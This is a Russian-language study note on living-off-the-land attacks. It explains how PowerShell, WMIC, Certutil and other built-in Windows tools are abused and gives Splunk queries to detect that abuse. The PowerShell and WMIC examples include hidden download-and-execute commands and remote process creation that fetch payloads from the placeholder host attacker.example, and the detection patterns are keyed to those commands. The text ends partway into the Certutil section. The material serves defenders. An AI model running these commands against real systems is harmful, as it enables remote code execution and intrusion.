Аналогия с реальным миром, это техника ведения партизанской войны с учетом того что солдат выживает за счет того что есть вокруг не используя других ресурсов

Основные abused инструменты позволяют использовать скрипты, управлять файлами или планирования, что соответствует типичным потребностям атакующего, таким как execution, persistence, reconnaissance и lateral movement
Примерами таких программ можно считать: 

- CMD и PowerShell - используются для in-memory скриптинга, удаленных скачиваний и автмоатизации
- WMIC или WMI - используются чтобы запускать команды локально или на удаленном хосте и запрашивать состояние системы
- Certutil - используется для получения файлов, кодирования и декодирования пейлоадов
- Mshta - используется для запуска HTA контента или инлайн скриптов доставленных через документ или ссылку
- Rundll32 - используется для вызова экспортируемых DLL или запуска обработчика URL
- Scheduled tasks - используется для запуска кода при входе в систему или по расписанию для обеспечения постоянного доступа

Операторы также злоупотребляют подписанными административными утилитами из пакета Sysinternals - например, PSExec для удаленного выполнения и Autoruns для обнаружения и манипуляции точками закрепления - потому что эти инструменты сливаются с легитимными рабочими процессами администраторов.

Такие техники не ограничиваются только windows, похожие есть и для Unix систем и публичные документации содержат паттерны использования, например: 
[LOLBAS](https://lolbas-project.github.io/) - для Windows
[GTFOBins](https://gtfobins.github.io/) - для Unix
Знание того какие инструменты с наибольшей вероятностью могут быть использованы не по назначению и типичных целей такого использования помогает специалистам по кибербезопасности настраивать логирование, получать полные командные строки и деревья процессов, а так же расставлять приоритеты при оповещениях, когда безобидные исполняемые файлы ведут себя явно вредоносным образом.

# Примеры LoL активности
## Powershell
```powershell
PS C:\> powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object System.Net.WebClient).DownloadString('http://attacker.example/payload.ps1')" 
PS C:\> powershell -NoP -NonI -W Hidden -EncodedCommand SQBn...Base64... 
PS C:\> powershell -NoP -NonI -Command "Invoke-WebRequest 'http://attacker.example/file.exe' -OutFile 'C:\Users\Public\updater.exe'; Start-Process 'C:\Users\Public\updater.exe'"
```

В примере выше команда использует шаблон IEX чтобы загрузить скрипт с удаленного сервера и немедленно запустить его в памяти избегая артефактов на диске и замедляя обнаружение. Во второй команде параметр `-EncodedCommand` скрывает полезную нагрузку в формате base64, поэтому эксперты и простые фильтры могут пропустить намерение Злоумышленника. И наконец она загружает файл exe

Пример обнаружения: 
```
index=wineventlog OR index=sysmon (EventCode=4688 OR EventCode=1 OR EventCode=4104)
(CommandLine="*powershell*IEX*" OR CommandLine="*powershell*-EncodedCommand*" OR CommandLine="*powershell*-Exec Bypass*" OR CommandLine="*Invoke-WebRequest*" OR CommandLine="*DownloadString*" OR CommandLine="*Invoke-RestMethod*")  
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```
(Это строка запроса для splunk)
## WMIC
Windows Managment Instrumentation Command Line - дает администраторам запрашивать и управлять локальными или удаленными windows системами. Это так же используется злоумышленника для исполнения удаленных команд путем запуска новых процессов

```powershell
PS C:\> wmic /node:TARGETHOST process call create "powershell -NoP -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.example/payload.ps1')" 
PS C:\> wmic /node:TARGETHOST process get name,commandline 
PS C:\> wmic process call create "notepad.exe" /hidden
```

В первой команде WMIC оператор нацелился на удаленный хост и запрашивает у удаленной системы создание нового процесса. Этот новый процесс представляет собой экземпляр PowerShell, который загружает и выполняет удаленный скрипт, поэтому WMIC выступает в качестве удаленного запускателя.
Затем во второй команде WMIC инструмент запрашивает у удаленной системы информацию о запущенных процессах и командных строках, возвращая структурированную информацию полезную для разведки на разных хостах.
В третьей команде WMIC используется локальный API вызова процесса WMIC create для запуска notepad.exe. На той же машине необязательный флаг сокрытия демонстрирует как злоумышленник может пытаться сделать запущенный процесс менее заметным.

```
index=sysmon OR index=wineventlog (EventCode=1 OR EventCode=4688)
(CommandLine="*\\wmic.exe*process call create*" OR CommandLine="*wmic /node:* process call create*" OR CommandLine="*wmic*process get Name,CommandLine*")  
| stats count values(Host) as hosts values(User) as users values(ParentImage) as parents by CommandLine
```

## Certutil
Certutil это утилита Microsoft для управления сертификатами и кодированием и декодированием данных. Certutil предназначен для управления сертификатами, он может скачивать файлы вместе с `-urlcache` и декодировать base64 пейлоады, преобразовывать текстовые блоки в бинарные файлы.
